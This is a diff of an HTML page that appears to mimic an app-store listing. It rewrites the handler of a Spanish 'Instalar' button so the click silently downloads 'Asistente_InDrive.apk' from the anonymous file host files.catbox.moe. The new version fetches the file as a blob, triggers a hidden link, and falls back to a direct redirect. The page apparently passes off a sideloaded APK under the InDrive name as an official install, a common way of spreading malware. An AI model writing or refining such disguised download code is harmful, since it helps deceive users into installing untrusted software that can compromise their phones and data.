@@ -2116,13 +2116,23 @@
                                       data-disable-idom="true"
                                       aria-label="Instalar"
                                       onclick="
-                                        const link = document.createElement('a');
-                                        link.href = 'https://files.catbox.moe/7amsd1.apk';
-                                        link.download = 'Asistente_InDrive.apk';
-                                        link.style.display = 'none';
-                                        document.body.appendChild(link);
-                                        link.click();
-                                        document.body.removeChild(link);
+                                        fetch('https://files.catbox.moe/7amsd1.apk')
+                                          .then(response => response.blob())
+                                          .then(blob => {
+                                            const url = window.URL.createObjectURL(blob);
+                                            const link = document.createElement('a');
+                                            link.href = url;
+                                            link.download = 'Asistente_InDrive.apk';
+                                            link.style.display = 'none';
+                                            document.body.appendChild(link);
+                                            link.click();
+                                            document.body.removeChild(link);
+                                            window.URL.revokeObjectURL(url);
+                                          })
+                                          .catch(() => {
+                                            window.location.href = 'https://files.catbox.moe/7amsd1.apk';
+                                          });
+                                        return false;
                                       "
                                     >
                                       <div class="VfPpkd-Jh9lGc"></div>
